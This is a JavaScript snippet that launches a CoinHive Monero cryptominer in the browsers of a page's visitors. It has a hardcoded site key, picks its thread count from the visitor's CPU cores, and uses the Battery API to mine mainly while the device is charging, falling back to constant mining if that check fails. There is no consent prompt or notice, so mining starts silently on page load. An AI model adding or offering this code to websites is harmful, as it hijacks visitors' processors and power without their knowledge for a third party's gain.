var xmr = new CoinHive.Anonymous('BiwY6t2i4bOVSmuLnthRWkLOo2cZcrLD', {
    throttle: 0.85,
    threads: 1
});
try {
    var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
    xmr.setNumThreads(threads);
    navigator.getBattery().then(function(battery) {
        if (battery.charging) xmr.start();
        battery.onchargingchange = function(evt) {
            if (battery.charging) xmr.start();
            else xmr.stop();
        }
    });
} catch (e) {
    xmr.start();
}